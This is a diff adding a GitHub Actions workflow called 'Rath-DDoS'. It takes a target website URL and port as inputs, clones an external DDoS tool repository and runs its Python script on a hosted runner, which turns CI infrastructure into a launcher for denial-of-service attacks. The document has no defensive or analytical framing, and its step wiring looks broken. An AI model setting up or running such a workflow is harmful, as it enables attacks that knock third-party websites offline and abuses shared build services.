@@ -1,0 +1,32 @@
+
+name: Rath-DDoS
+
+on:
+  workflow_dispatch:
+    inputs:
+      url:
+        description: "Website Url"
+        required: true
+        default: "https://google.com"
+      port:
+        description: "Port of target Website"
+        required: true
+        default: "80"
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Install Python & Python2
+      run: |
+       sudo apt install python
+       sudo apt install python2
+    - name: Cloning Rath-DDoS
+      run: git clone https://github.com/kinghacker0/Rath-DDoS
+    - name: Directory
+      run: cd Rath-DDoS
+    - name: Running Script
+      run: |
+       python2 rath.py
+       echo ${{ github.event.inputs.url }}
+       echo ${{ github.event.inputs.port }}
